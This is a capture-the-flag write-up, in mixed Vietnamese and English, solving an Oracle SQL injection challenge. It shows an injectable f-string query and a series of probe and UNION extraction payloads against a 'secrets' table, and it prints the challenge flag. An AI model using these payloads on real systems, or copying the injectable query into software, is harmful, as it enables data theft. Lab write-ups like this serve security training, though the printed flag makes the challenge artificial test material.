# SQLi-004 Solution Writeup

## Vulnerability Analysis

API có lỗ hổng SQL Injection trong tham số `id`.

### Vulnerable Code

```python
sql = f"SELECT * FROM products WHERE id = {product_id}"
```

---

## Step-by-Step Solution

### Step 1: Comment Detection

**Test với `--` comment:**
```
GET /api/product?id=1--
```
**Result:** Trả về product bình thường → `--` comment works

**Test với `#` comment (MySQL style):**
```
GET /api/product?id=1#
```
**Result:** Error hoặc không work → NOT MySQL

**Test với `/* */` comment:**
```
GET /api/product?id=1/*comment*/
```
**Result:** Works → Multi-line comment accepted

---

### Step 2: Xác nhận Oracle

**Test `OR 1=1` với comment:**
```
GET /api/product?id=1 OR 1=1--
```
**Result:** Trả về TẤT CẢ products → SQLi confirmed!

**Oracle-specific test:**
```
GET /api/product?id=1 AND 1=(SELECT 1 FROM dual)--
```
**Result:** Works → Confirmed Oracle (FROM dual required)

---

### Step 3: Error-based Oracle Detection

Trigger error để xác nhận:
```
GET /api/product?id=1'
```
**Error pattern:** `ORA-01756: quoted string not properly terminated`

---

### Step 4: UNION-based extraction

Oracle cần số columns chính xác:
```
GET /api/product?id=0 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM dual--
```

Extract flag:
```
GET /api/product?id=0 UNION SELECT 1,secret_value,secret_name,4,'ctf','FLAG',0 FROM secrets--
```

---

## Final Payload

```
0 UNION SELECT 1,secret_value,secret_name,4,'ctf','FLAG',0 FROM secrets WHERE secret_name='sqli_004'--
```

---

## Flag

```
FLAG{c0mm3nt_d3t3ct10n_0r4cl3_m4st3r}
```

---

## Key Learnings

1. **Oracle không support `#` comment** - chỉ `--` và `/* */`
2. **Error pattern Oracle**: `ORA-XXXXX`
3. **FROM dual** required cho simple SELECT trong Oracle
4. Comment characters giúp "terminate" phần query còn lại

## Oracle vs MySQL Comments

| DBMS | Single-line | Multi-line | Notes |
|------|-------------|------------|-------|
| Oracle | `--` | `/* */` | NO `#` support |
| MySQL | `--` (space), `#` | `/* */` | Space required after `--` |
| MSSQL | `--` | `/* */` | Similar to Oracle |
| PostgreSQL | `--` | `/* */` | Similar to Oracle |
